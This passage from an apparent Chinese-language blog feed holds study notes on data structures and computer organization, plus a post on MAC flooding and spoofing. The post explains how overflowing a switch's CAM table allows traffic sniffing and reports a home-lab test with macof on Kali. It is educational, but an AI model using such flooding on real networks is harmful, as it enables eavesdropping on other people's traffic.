转换而成的森林。</li></ul></li></ul></li><li>森林的先序遍历<ul><li>若森林为非空，则按照如下规则进行遍历：</li><li>访问森林中第一棵树的根结点</li><li>先序遍历第一棵树中根节点的子树森林</li><li>先序遍历除去第一棵树之后剩余的树构成的森林</li></ul></li><li>森林的中序遍历（效果等同于依次对二叉树的中序遍历）<ul><li>若森林为非空，则按照如下规则进行遍历：</li><li>中序遍历森林中第一棵树的根节点的子树森林</li><li>访问第一棵树的根节点</li><li>中序遍历除去第一棵树之后剩余的树构成的森林</li></ul></li></ul></li><li><p>堆(Heap) 优先级队列</p><ul><li>每次出队列的是优先权最高的元素。</li><li>用堆实现其存储表示，能够高效运作。</li><li>堆的元素下标计算<ul><li>由于堆存储在下标从 0 开始计数的一维数组中，因此在堆中给定下标为 i 的结点时 </li><li>如果 i = 0，结点 i 是根结点，无双亲；否则结点 i 的父结点为结点 $\lfloor(i-1) / 2\rfloor$； </li><li>如果 2i+1＞n-1，则结点 i 无左子女；否则结点 i 的左子女为结点 2i+1； </li><li>如果 2i+2＞n-1，则结点 i 无右子女；否则结点 i 的右子女为结点 2i+2。</li></ul></li><li><strong>（算法）最小堆的下滑调整算法</strong></li><li><strong>（算法）最小堆的插入</strong>：每次插入都加在堆的最后，再自下向上执行调整，使之重新形成堆，时间复杂性$O(log_2n)$</li><li><strong>（算法）最小堆的向上调整</strong></li><li><strong>（算法）最小堆的删除算法</strong></li></ul></li><li><p>Huffman树</p><p>给定N个权值作为N个叶子结点，构造一棵二叉树，若该树的带权路径长度达到最小，称这样的二叉树为最优二叉树，也称为哈夫曼树(Huffman Tree)。哈夫曼树是带权路径长度最短的树，权值较大的结点离根较近。</p><p>假设有n个权值，则构造出的哈夫曼树有n个叶子结点。 n个权值分别设为 $w_1、w_2、…、w_n$，则哈夫曼树的构造规则为：</p><ol><li>将$w_1、w_2、…、w_n$看成是有n 棵树的森林(每棵树仅有一个结点)；</li><li>在森林中选出两个根结点的权值最小的树合并，作为一棵新树的左、右子树，且新树的根结点权值为其左、右子树根结点权值之和；</li><li>从森林中删除选取的两棵树，并将新树加入森林；</li><li>重复2、3步，直到森林中只剩一棵树为止，该树即为所求得的哈夫曼树。</li></ol></li></ul><div class="table-container"><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table></div><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>Dijkstra单源最短路径算法<br>从尾到头打印链表<br>快速排序的思想，时间复杂度，是不是稳定的<br>堆排序的思想，时间复杂度，是不是稳定的<br>二叉树的最大深度<br>两个栈实现队列<br>最长公共前缀<br>链表的倒数第k个数<br>合并两个排序的链表<br>存在重复元素 III<br>翻转二叉树<br>最长连续递增序列<br>有效的括号<br>最长有效括号<br>三数之和<br>数组的相对排序<br>二叉树的遍历方式<br>用队列实现栈<br>二分查找<br>接雨水</p><p>作者：陈乐乐<br>链接：<a href="https://leetcode-cn.com/circle/discuss/rl1CTM/" target="_blank" rel="noopener">https://leetcode-cn.com/circle/discuss/rl1CTM/</a><br>来源：力扣（LeetCode）<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> 课程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MAC地址泛洪与欺骗</title>
      <link href="/2021/03/04/MAC%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/"/>
      <url>/2021/03/04/MAC%E5%9C%B0%E5%9D%80%E6%AC%BA%E9%AA%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-理论"><a href="#1-理论" class="headerlink" title="1 理论"></a>1 理论</h1><h2 id="1-1-原理"><a href="#1-1-原理" class="headerlink" title="1.1 原理"></a>1.1 原理</h2><p>　　MAC地址欺骗是数据链路层攻击，它是利用<strong>交换机端口学习的漏洞</strong>，通过客户端向交换机发送欺骗报文、攻击交换机的CAM表的方式，使交换机CAM表的记录与真实的主机对应MAC地址不一致，从而使交换机将报文错误转发给攻击者。</p><p>　　MAC地址泛洪攻击，每台交换机的CAM表都有最大记录条数，当交换机端口学习得到的记录大于交换机CAM表条数上限时，交换机收到一个网络帧，只要其目标主机的MAC地址不存在于该交换机CAM表中，那么该帧会以广播的方式发向交换机的每一个端口，此时的交换机就相当于一个集线器HUB，我们就可以监听网络中的所有通讯报文。</p><p>　　与ARP攻击不同：MAC地址欺骗改变的是端口/MAC地址映射关系，ARP攻击改变的是IP/MAC地址映射关系。</p><p>　　MAC地址泛洪攻击针对路由器不行，原因是路由器仅仅转发特定地址的数据包，不传送不支持路由协议的数据包传送和未知目标网络数据包的传送，从而可以防止广播风暴。参考：<a href="https://www.cnblogs.com/Lynn-Zhang/articles/5754336.html" target="_blank" rel="noopener">交换机和路由器的区别在哪里 一针见血通俗解答</a></p><p>　　实验网络拓扑如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/Dragonliu2018/FigureBed@master/img/Snipaste_2021-03-05_11-19-37.jpg" class="lozad"></p><h2 id="1-2-知识储备"><a href="#1-2-知识储备" class="headerlink" title="1.2 知识储备"></a>1.2 知识储备</h2><ul><li><strong>MAC地址</strong>：它是一个用来确认网络设备位置的位址。在<a href="https://baike.baidu.com/item/OSI模型" target="_blank" rel="noopener">OSI模型</a>中，第三层网络层负责<a href="https://baike.baidu.com/item/IP地址" target="_blank" rel="noopener">IP地址</a>，第二层数据链路层则负责MAC位址。MAC地址用于在网络中唯一标示一个<a href="https://baike.baidu.com/item/网卡" target="_blank" rel="noopener">网卡</a>，一台设备若有一或多个网卡，则每个网卡都需要并会有一个唯一的MAC地址。由网络设备制造商生产时烧录在网卡(Network lnterface Card)的<a href="https://baike.baidu.com/item/EPROM/1690813" target="_blank" rel="noopener">EPROM</a>(一种闪存芯片，通常可以通过程序擦写)。<a href="https://baike.baidu.com/item/IP地址/150859" target="_blank" rel="noopener">IP地址</a>与MAC地址在计算机里都是以<a href="https://baike.baidu.com/item/二进制/361457" target="_blank" rel="noopener">二进制</a>表示的，IP地址是32位的，而MAC地址则是48位的，通常表示为12个16进制数，如：00-16-EA-AE-3C-40就是一个MAC地址。</li><li><strong>交换机</strong>：主要功能是在局域网内的主机之间转发数据帧，工作核心是<strong>端口/MAC地址映射表</strong>，这张表里记录了交换机每个端口同与之相连的主机MAC地址之间的对应关系。交换机接收从主机上传来的比特流之后，要先将其缓存成数据帧，然后通过分析帧头中的MAC地址，交换机就可以判断出数据的发送方和接收方，在映射表里查找与数据帧的目的MAC地址相对应的端口。若找到则发给目的主机；若找不到则以广播的方式将这个数据帧向除了源端口以外的其它所有端口转发，从而将数据发送给了目的主机，并记录端口与MAC地址的对应关系。</li></ul><h1 id="2-实战"><a href="#2-实战" class="headerlink" title="2 实战"></a>2 实战</h1><h2 id="2-1-MAC地址欺骗"><a href="#2-1-MAC地址欺骗" class="headerlink" title="2.1 MAC地址欺骗"></a>2.1 MAC地址欺骗</h2><ol><li><strong>准备</strong>：没有交换机物理设备，vmware中桥接模式中有虚拟交换机(但是无法登陆后台)，所以只能利用路由器测试(也无法进入后台)，只能查看现象了。</li><li>此处未进行实践，可参考：<a href="https://blog.csdn.net/redwand/article/details/105388491?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">MAC地址欺骗与MAC地址泛洪攻击（eNSP环境演示）</a></li></ol><h2 id="2-2-MAC地址泛洪攻击"><a href="#2-2-MAC地址泛洪攻击" class="headerlink" title="2.2 MAC地址泛洪攻击"></a>2.2 MAC地址泛洪攻击</h2><ol><li>以<code>kali</code>为攻击机，使用<code>macof</code>命令向网络中发送大量网络不存在的源mac地址，堵塞交换机(路由器)的CAM表；</li><li>攻击前，<code>Win物理机</code>可以ping通kali、node01、node02、node03；</li><li>攻击后，按道理此时的路由器中的CAM表中存在大量陌生MAC地址记录，但是目前无法查看；现象为：请求超时或间断ping通，但可以ping通外网及局域网内其它主机。</li></ol><h1 id="3-存在问题"><a href="#3-存在问题" class="headerlink" title="3 存在问题"></a>3 存在问题</h1><ul><li>没有物理交换机，虚拟交换机无法登陆后台<font color="#008000"></font></li><li>用路由器测试，但是无法登录后台查看CAM表，可参考：<a href="https://cloud.tencent.com/developer/article/1482014" target="_blank" rel="noopener">小米路由器开启SSH</a></li></ul><h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4 参考"></a>4 参考</h1><ul><li><a href="https://baike.baidu.com/item/MAC%E5%9C%B0%E5%9D%80/1254181?fr=aladdin" target="_blank" rel="noopener">百度百科-MAC地址</a></li><li><a href="https://blog.csdn.net/weixin_34234829/article/details/85088965?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs&amp;dist_request_id=&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.baidujs" target="_blank" rel="noopener">MAC泛洪<em>*</em>的实施与防御</a></li><li><a href="https://blog.csdn.net/redwand/article/details/105388491?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&amp;spm=1001.2101.3001.4242" target="_blank" rel="noopener">MAC地址欺骗与MAC地址泛洪攻击（eNSP环境演示）</a></li><li><a href="https://www.youtube.com/watch?v=FiDq8g0gBsI" target="_blank" rel="noopener">亁颐堂现任明教教主CCNA Security 2019 7 第三天 2 MAC泛洪MAC欺骗</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计组复习</title>
      <link href="/2021/03/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/03/02/%E8%AE%A1%E7%BB%84%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="第1章-计算机系统基础概述"><a href="#第1章-计算机系统基础概述" class="headerlink" title="第1章 计算机系统基础概述"></a>第1章 计算机系统基础概述</h1><h2 id="预习问题"><a href="#预习问题" class="headerlink" title="预习问题"></a>预习问题</h2><h3 id="0x01-计算机和计算器的工作模式是一样的吗？为什么？"><a href="#0x01-计算机和计算器的工作模式是一样的吗？为什么？" class="headerlink" title="0x01 计算机和计算器的工作模式是一样的吗？为什么？"></a>0x01 计算机和计算器的工作模式是一样的吗？为什么？</h3><p> 　　不一样。计算器：使用的是固化的处理程序，只能完成特定的计算任务；不能完全自动地实现计算操作，必须有人工参与。计算机：通过编制程序能够自动处理；借助操作系统平台和各类应用软硬件，可以无限扩展其应用领域。</p><h3 id="0x02-现代计算机的工作过程是怎样的？"><a href="#0x02-现代计算机的工作过程是怎样的？" class="headerlink" title="0x02 现代计算机的工作过程是怎样的？"></a>0x02 现代计算机的工作过程是怎样的？</h3><p>　　<a href="https://baike.baidu.com/item/%E5%AD%98%E5%82%A8%E7%A8%8B%E5%BA%8F/8800242" target="_blank" rel="noopener">存储程序</a>和程序控制。计算机的工作过程就是执行程序的过程。先编制程序，通过输入设备把程序送到计算机的存储器中保存起来，即程序存储，然后执行程序。执行程序其实就是逐条执行指令，每条指令的执行又可分为以下四个基本操作：取出指令，即从存储器某个地址中取出要执行的指令送到CPU内部的指令寄存器暂存；分析指令，即把保存在指令寄存器中的指令送到指令译码器’译出该指令对应的微操作；执行指令，即根据指令译码向计算机各部件发出相应控制信号，完成指令规定的操作；为执行下一条指令做好准备，即形成下一条指令地址。</p><h3 id="0x03-谈谈你对计算机层次结构和ISA的理解。"><a href="#0x03-谈谈你对计算机层次结构和ISA的理解。" class="headerlink" title="0x03 谈谈你对计算机层次结构和ISA的理解。"></a>0x03 谈谈你对计算机层次结构和ISA的理解。</h3><p><img alt="&#x56FE;1 &#x8BA1;&#x7B97;&#x673A;&#x5C42;&#x6B21;&#x7ED3;&#x6784;" data-src="H:/project_work/github/UCN/.gitbook/assets/snipaste_2020-03-08_09-11-58.jpg" class="lozad"></p><ol><li>应用：满足最终用户的需求</li><li>算法：算法描述可解决应用问题，使得应用问题的求解变成流程化的清晰步骤</li><li>编程语言：程序员进行程序设计将算法转化为用编程语言描述的程序</li><li>操作系统/虚拟机：操作系统为所有的语言处理系统提供运行环境，是对计算机底层结构和计算机硬件的一种抽象，这种抽象构成了一台可以让程序员使用的虚拟机</li><li>ISA理解：位于软硬件交界面。定义了一台计算机可以执行的所有指令的集合，每条指令规定了计算机执行什么操作，所处理的操作数存放的地址空间以及操作数类型。ISA是一种规约，计算机组成的抽象，规定了如何使用硬件所有软件功能都建立在ISA之上。 ISA维基百科解释：<a href="https://zh.wikipedia.org/wiki/%E6%8C%87%E4%BB%A4%E9%9B%86%E6%9E%B6%E6%A7%8B" target="_blank" rel="noopener">我跳</a> ISA百度百科解释：<a href="https://baike.baidu.com/item/%E6%8C%87%E4%BB%A4%E9%9B%86%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84" target="_blank" rel="noopener">我跳</a></li><li>微体系结构：具体实现ISA规定的指令</li><li>功能部件：各个功能部件构成微体系结构</li><li>电路：电路实现各个功能部件</li><li>器件：按照特定的器件技术实现基本的逻辑电路</li><li>功能转换：上层是下层的抽象，下层是上层的实现，底层为上层提供支撑环境！</li></ol><h3 id="0x04-hello-c在计算机中是怎样被运行的？"><a href="#0x04-hello-c在计算机中是怎样被运行的？" class="headerlink" title="0x04 hello.c在计算机中是怎样被运行的？"></a>0x04 hello.c在计算机中是怎样被运行的？</h3><p><img alt="&#x56FE;2 hello.c&#x5904;&#x7406;&#x8FC7;&#x7A0B;" data-src="H:/project_work/github/UCN/.gitbook/assets/snipaste_2020-03-08_10-50-35.jpg" class="lozad"></p><p><img alt="&#x56FE;3 Hello&#x7A0B;&#x5E8F;&#x7684;&#x6570;&#x636E;&#x6D41;&#x52A8;&#x8FC7;&#x7A0B;&#x2014;&#x2014;&#x53EF;&#x6267;&#x884C;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;" data-src="H:/project_work/github/UCN/.gitbook/assets/snipaste_2020-03-08_11-14-43.jpg" class="lozad"></p><ol><li>转换（图2）：hello.c预处理生成hello.i，结果再进行编译生成汇编语言程序hello.s，在经过汇编程序转化为目标程序hello.o，将hello.o与printf.o链接生成可执行目标程序。</li><li>执行（图3)：Shell程序读取字符串” ./hello”中各字符到寄存器，然后存放到主存; “Enter”键输入后，操作系统内核(载入程序)根据主存中的字符串”hello“到磁盘上找到特定的hello目标文件，将其包含的指令代码和数据(“hello, world\n”)从磁盘读到主存，并将控制权转交给hello程序，即将hello程序的第一条指令的地址送到PC中; 处理器从hello主程序的指令代码开始执行; Hello程序将”hello, world\n”串中的字节从主存读到寄存器，再从寄存器输出到显示器上。</li></ol><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><h3 id="0x01-冯·诺依曼结构的基本构成和基本原理"><a href="#0x01-冯·诺依曼结构的基本构成和基本原理" class="headerlink" title="0x01 冯·诺依曼结构的基本构成和基本原理"></a>0x01 冯·诺依曼结构的基本构成和基本原理</h3><ol><li>计算机应由<strong>运算器、控制器、存储器、输入设备和输出设备</strong>五个基本部件组成。</li><li>存储器不仅能存放数据，而且也能存放指令，形式上两者<strong>没有区别</strong>，但计算机应能区分数据还是指令；  </li><li>控制器应能自动取出指令来执行；</li><li>运算器应能进行加/减/乘/除四种基本算术运算，并且也能进行一些逻辑运算和附加运算； 操作人员可以通过输入设备、输出设备和主机进行通信。</li><li>内部以二进制表示指令和数据。每条指令<strong>由操作码和地址码两部分组成</strong>。操作码指出操作类型，地址码指出操作数的地址。由一串指令组成程序。</li><li>采用“存储程序”工作方式。</li></ol><h3 id="0x02-计算机指令执行的基本过程"><a href="#0x02-计算机指令执行的基本过程" class="headerlink" title="0x02 计算机指令执行的基本过程"></a>0x02 计算机指令执行的基本过程</h3><p><img alt="&#x56FE;4 &#x73B0;&#x4EE3;&#x8BA1;&#x7B97;&#x673A;&#x7ED3;&#x6784;&#x6A21;&#x578B;" data-src="H:/project_work/github/UCN/.gitbook/assets/snipaste_2020-03-08_12-46-46.jpg" class="lozad"></p><blockquote><p>CPU:中央处理器;  PC: 程序计数器;   MAR: 存储器地址寄存器   ALU:算术逻辑部件;   IR:指令寄存器;    MDR:存储器数据寄存器   GPRs:通用寄存器组(由若干通用寄存器组成，早期就是累加器)</p></blockquote><p><img alt="&#x56FE;5 &#x6307;&#x4EE4;&#x6267;&#x884C;&#x8FC7;&#x7A0B;" data-src="H:/project_work/github/UCN/.gitbook/assets/snipaste_2020-03-10_11-36-51.jpg" class="lozad"></p><h3 id="0x03-计算机层次结构中各层出现的原因和作用及ISA在计算机系统结构中的重要作用-—（预习问题3）"><a href="#0x03-计算机层次结构中各层出现的原因和作用及ISA在计算机系统结构中的重要作用-—（预习问题3）" class="headerlink" title="0x03 计算机层次结构中各层出现的原因和作用及ISA在计算机系统结构中的重要作用 —（预习问题3）"></a>0x03 计算机层次结构中各层出现的原因和作用及ISA在计算机系统结构中的重要作用 —（预习问题3）</h3><h3 id="0x04-hello-c在计算机上运行的全过程-—-（预习问题4）"><a href="#0x04-hello-c在计算机上运行的全过程-—-（预习问题4）" class="headerlink" title="0x04 hello.c在计算机上运行的全过程 — （预习问题4）"></a>0x04 hello.c在计算机上运行的全过程 — （预习问题4）</h3><h2 id="错题记录"><a href="#错题记录" class="headerlink" title="错题记录"></a>错题记录</h2><ol><li><strong>汇编语言程序vs. 汇编程序</strong> 　　汇编语言程序就是你用汇编语言写的文本型的程序，我们说用一堆助记符来写的源代码。汇编程序是汇编阶段用来把汇编语言翻译成机器语言指令的程序。二者是不同的概念。引自：<a href="https://blog.csdn.net/u011240016/article/details/53433811" target="_blank" rel="noopener">我跳</a></li></ol><h2 id="PA0问题"><a href="#PA0问题" class="headerlink" title="PA0问题"></a>PA0问题</h2><ol><li><p>Linux and Linux?</p><ul><li>相同点：四者都是Linux的发行版本，都使用Linux内核；</li><li>不同点：<strong>从发行系列角度</strong>，Debian和Ubuntu属于一个系列， CentOS和Red Hat属于一个系列；<strong>从性质角度</strong>，linux大体分为由商业公司维护的商业版本与由开源社区维护的免费发行版本，商业版本以Redhat为代表，开源社区版本则以Debian为代表；<strong>从用户或者用途角度</strong>， CentOS 、Red Hat 、Debian通常用于服务器领域，内核版本通常使用Linux2.6版本，运行十分稳定，而Ubuntu通常用于桌面领域，内核版本通常比较新，一般跟Linux内核同步更新；<strong>从安装包管理方式角度</strong>， CentOS和Red Hat使用yum/rpm进行安装包管理，Debian和Ubuntu 使用apt/dpkg的管理方式，但使用配置上大同小异。</li></ul></li><li><p>Can’t memory be larger?</p><p>问题1：内存大小不能无限大，一方面32位系统最大只能支持4GB内存，另一方面取决于物理机内存。</p><p>问题2： CPU不能直接访问硬盘的数据，只能通过把硬盘的数据先放到内存里， 然后再从内存里访问硬盘的数据。计算机操作系统会给内存每1个字节分配1个内存地址，在32位操作系统中, 内存的地址就是32位的2进制数，所以32位的地址范围是0x00000000 ~ 0xFFFFFFFF。地址个数：2^32 = 4 * 1024(G) * 1024(M) * 1024(K) = 4294967296 ,而每1个地址对应1个1个字节， 容量就是1byte， 所以2^32个地址就总共能对应应<strong>4GB</strong> 的内存容量。简言之，CPU寻址范围决定最大支持内存。</p></li><li><p>Why Windows is quite ‘fat’?</p><p>Windows有GUI，而我们安装的Debian是CLI，没有图形化界面，所以安装Windows需要更多的磁盘空间和内存，因此Debian非常‘slim’，Windows相当’fat’。</p></li><li><p>Why executing the ‘poweroff’ command requires superuser privilege?</p><p>当Linux被用作服务器或类似服务器时，很多用户通过SSH进入Linux机器，其中一个具有SSH访问权限的人将其关闭，其他远程登录的用户也被迫关机，如果其他用户在做十分重要的事情，那么损失很大，此外，远程登录的用户将无法重新打开它。</p></li><li><p>What happened?</p><p><code>make</code>命令执行后，读入所有的Makefile，目标文件与所有的<code>.c</code>文件创建依赖关系，目标文件生成，对应的整个项目被编译。</p></li><li><p>How will you do?</p><p>最重要的是设计好CPU，编写程序，使控制器能够控制运算器进行数据加工、从内存取送数据；存储器能够保存信息；然后再编写驱动程序能够驱动I/O等外部设备。</p></li></ol><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><h3 id="0x01-你对计算机抽象层次结构的理解是怎样的？是不是觉得这个“抽象”本身就很抽象？也可以说说你的疑问。"><a href="#0x01-你对计算机抽象层次结构的理解是怎样的？是不是觉得这个“抽象”本身就很抽象？也可以说说你的疑问。" class="headerlink" title="0x01 你对计算机抽象层次结构的理解是怎样的？是不是觉得这个“抽象”本身就很抽象？也可以说说你的疑问。"></a>0x01 你对计算机抽象层次结构的理解是怎样的？是不是觉得这个“抽象”本身就很抽象？也可以说说你的疑问。</h3><ol><li>计算机系统可以从电路到算法进行多个层次的观察，在每一个较高的抽象层次都隐藏了较低层次的细节和复杂度。</li><li>抽象去除了系统中有关部件的不必要的实现细节，使得设计者可以聚焦于有助于问题得到解决的关键方面。</li><li>抽象的一个重要特点是修改低层抽象不需要改变它上层的内容，这样就使得各层结构具有通用性，而不至于牵一发而动全身。</li><li>感觉可以类比C++中的对象，抽象、封装。</li></ol><h1 id="第2章-数据的机器级表示与处理"><a href="#第2章-数据的机器级表示与处理" class="headerlink" title="第2章 数据的机器级表示与处理"></a>第2章 数据的机器级表示与处理</h1><h2 id="数据表示基础"><a href="#数据表示基础" class="headerlink" title="数据表示基础"></a>数据表示基础</h2><h3 id="0x01-进制转化"><a href="#0x01-进制转化" class="headerlink" title="0x01 进制转化"></a><strong>0x01 进制转化</strong></h3><ol><li><strong>出题</strong>：<script type="math/tex">\frac{2010}{128} 转二进制或十六进制</script> ：2010用到快速转换(2048 - 38 = 2047 - 37)得到0111 1101 1010，再除以一个128( <script type="math/tex">2^7</script> )是小数点向左移动7位得 0111 1.101 1010，转十六进制注意补零得F.B4。</li><li>R进制转十进制：按权展开</li><li>十进制转R进制：整数部分(除基取余，上右下左)、小数部分(乘基取整，上左下右)</li><li>二、八、十六进制相互转化：每三位、四位一转，整数部分从低位到高位，小数部分从高位到低位，注意补0</li><li><strong>快速转换(记住常见的2的幂次)：</strong> <script type="math/tex">2^5= 32，2^6 = 64，2^7 = 128，2^8 = 256，2^9= 512，2^{10} = 1024(KB)，2^{11} = 2048，2^{12} = 4096，2^{13}= 8192，2^{14} = 16384，2^{15} = 32768，2^{16} = 65536，2^{20}= 1048576(MB)，2^{30} = 1073741824(GB)，2^{40} = 1TB</script></li><li>分数转化：注意分母是否是2的幂次 </li></ol><h3 id="0x02-虚拟存储器和虚拟地址空间"><a href="#0x02-虚拟存储器和虚拟地址空间" class="headerlink" title="0x02 虚拟存储器和虚拟地址空间"></a>0x02 <strong>虚拟存储器和虚拟地址空间</strong></h3><ol><li><strong>虚拟存储器：</strong>为了方便存储管理而提出的概念上的存储器，不能等同于物理内存</li><li><strong>虚拟地址空间：</strong>存储器为每个字节都编写一个唯一的地址，所有可能的地址集合，被称为虚拟地址空间。<strong>字长(用来指明整数和指针的标称大小)</strong>决定虚拟地址空间的大小。</li><li>区别：字表示被处理信息的单位，用来度量数据类型的宽度。</li></ol><h3 id="0x03-字与字节"><a href="#0x03-字与字节" class="headerlink" title="0x03 字与字节"></a>0x03 <strong>字与字节</strong></h3><ol><li>字长用来指明整数和指针的标称大小；数据通路的宽度。</li><li>数据通路指CPU内部数据流经的路径以及路径上的部件，主要是CPU内部进行数据运算、存储和传送的部件，这些部件的宽度基本上要一致，才能相互匹配。因此，”字长”等于CPU内部总线的宽度、运算器的位数、通用寄存器的宽度等。</li><li>字表示被处理信息的单位，用来度量数据类型的宽度。</li><li>字与字长可以相同，也可不同。</li></ol><h3 id="0x04-大端小端表示-测试"><a href="#0x04-大端小端表示-测试" class="headerlink" title="0x04 大端小端表示(测试)"></a>0x04 <strong>大端小端表示(测试)</strong></h3><ol><li><strong>小端法：LSB排在最小的地址处（与习惯反着）</strong></li><li><strong>大端法：MSB排在最小的地址处（与习惯相同）</strong></li><li><strong>按字节存储，一字节是8位(十六进制的2位)</strong></li><li><strong>指令：操作码-&gt;寄存器编号-&gt;立即数。只有立即数考虑字节顺序。</strong></li></ol><h2 id="数值型数据表示与处理"><a href="#数值型数据表示与处理" class="headerlink" title="数值型数据表示与处理"></a>数值型数据表示与处理</h2><h3 id="0x01-整数-定点数-补码"><a href="#0x01-整数-定点数-补码" class="headerlink" title="0x01 整数(定点数)补码"></a><strong>0x01 整数(定点数)补码</strong></h3><h4 id="1-补码定义"><a href="#1-补码定义" class="headerlink" title="1. 补码定义"></a>1. 补码定义</h4><p>　　假设补码有n位，则 <script type="math/tex">[X]_补 = 2^n + X( -2^n\leq X < 2^n, mod 2^n)</script> X是真值， <script type="math/tex">[X]_补</script> 是机器数。负权表示： <script type="math/tex">X = -2^{w-1} + \sum_{i=0}^{w-2}x_i2^i</script> </p><h4 id="2-转化-重点"><a href="#2-转化-重点" class="headerlink" title="2. 转化(重点)"></a>2. 转化(重点)</h4><ol><li>真值转补码：一个负数的补码等于对应正数补码按位取反、末位加1（简便方法：从右到左遇到第一个1前面各位取反）</li><li>补码转真值：符号为0，则为正数，数值部分相同；符号为1，则为负数，数值各位取反，末位加1.</li></ol><h4 id="3-补码表示带符号数的优势-重点"><a href="#3-补码表示带符号数的优势-重点" class="headerlink" title="3. 补码表示带符号数的优势(重点)"></a>3. 补码表示带符号数的优势(重点)</h4><ol><li>补码运算是模运算系统，加、减统一</li><li>数0的表示唯一，方便使用</li><li>比原码或反码多表示一个最小负数</li></ol><h4 id="4-注意"><a href="#4-注意" class="headerlink" title="4. 注意"></a>4. 注意</h4><ol><li>补码最小值不对称，n位机器码的最小负数 <script type="math/tex">1 00..00 (n-1个0)</script> </li><li>运算器可看作模为 <script type="math/tex">2^n</script> 的模运算系统</li></ol><h3 id="0x02-浮点数的编码表示"><a href="#0x02-浮点数的编码表示" class="headerlink" title="0x02 浮点数的编码表示"></a>0x02 浮点数的编码表示</h3><h4 id="1-表示"><a href="#1-表示" class="headerlink" title="1. 表示"></a>1. 表示</h4><h4 id="2-转化"><a href="#2-转化" class="headerlink" title="2. 转化"></a><strong>2. 转化</strong></h4><ol><li>真值转编码：将真值转为二进制科学计数法，填写<strong>Sign</strong>(单1双1，正0负1)，指数+Bias(单127双1023)填写<strong>exp</strong>(单8双11)，<strong>frac</strong>照搬小数部分(单23双52，末尾补0)</li><li>编码转真值：<strong>sign</strong>判断正负，<strong>exp</strong>-Bias得指数，<strong>frac</strong>根据exp转成二进制小数再转化(frac转成十进制小数再乘以exp)</li></ol><h2 id="非数值型数据表示"><a href="#非数值型数据表示" class="headerlink" title="非数值型数据表示"></a>非数值型数据表示</h2><h2 id="问题讨论"><a href="#问题讨论" class="headerlink" title="问题讨论"></a>问题讨论</h2><h3 id="0x01-C程序中的整数"><a href="#0x01-C程序中的整数" class="headerlink" title="0x01 C程序中的整数"></a>0x01 C程序中的整数</h3><h4 id="1-数据类型表示范围-64位机器-（重点）"><a href="#1-数据类型表示范围-64位机器-（重点）" class="headerlink" title="1. 数据类型表示范围(64位机器)（重点）"></a>1. 数据类型表示范围(64位机器)（重点）</h4><div class="table-container"><table><thead><tr><th style="text-align:center">类型名称</th><th style="text-align:center">字节数</th><th style="text-align:center">取值范围</th></tr></thead><tbody><tr><td style="text-align:center">(signed) char</td><td style="text-align:center">1</td><td style="text-align:center"><script type="math/tex">-2^7(-128)</script> ~ <script type="math/tex">2^7-1(127)</script></td></tr><tr><td style="text-align:center">usigned char</td><td style="text-align:center">1</td><td style="text-align:center">0 ~ <script type="math/tex">2^8-1(255)</script></td></tr><tr><td style="text-align:center">short (int)</td><td style="text-align:center">2</td><td style="text-align:center"><script type="math/tex">-2^{15}(-32 768)</script> ~ <script type="math/tex">2^{15}-1(32 767)</script></td></tr><tr><td style="text-align:center">usigned short</td><td style="text-align:center">2</td><td style="text-align:center">0 ~ <script type="math/tex">2^{16}-1(65 535)</script></td></tr><tr><td style="text-align:center">int</td><td style="text-align:center">4</td><td style="text-align:center"><script type="math/tex">-2^{31}(-2 147 483 648)</script> ~ <script type="math/tex">2^{31}-1(2 147 483 647)</script></td></tr><tr><td style="text-align:center">usigned （int)</td><td style="text-align:center">4</td><td style="text-align:center">0 ~ <script type="math/tex">2^{32}-1(4 294 967 295)</script></td></tr><tr><td style="text-align:center">long int</td><td style="text-align:center">4</td><td style="text-align:center"><script type="math/tex">-2^{31}(-2 147 483 648)</script> ~ <script type="math/tex">2^{31}-1(2 147 483 647)</script></td></tr><tr><td style="text-align:center">usigned long</td><td style="text-align:center">4</td><td style="text-align:center">0 ~ <script type="math/tex">2^{32}-1(4 294 967 295)</script></td></tr><tr><td style="text-align:center">long long</td><td style="text-align:center">8</td><td style="text-align:center"><script type="math/tex">-2^{63}(-9.2233720368548e+18)</script> ~ <script type="math/tex">2^{63}-1(9.2233720368548e+18)</script></td></tr><tr><td style="text-align:center">usigned long long</td><td style="text-align:center">8</td><td style="text-align:center">0 ~ <script type="math/tex">2^{64}-1(1.844674407371e+19)</script></td></tr></tbody></table></div><h4 id="2-编译器约定（重点）"><a href="#2-编译器约定（重点）" class="headerlink" title="2. 编译器约定（重点）"></a>2. 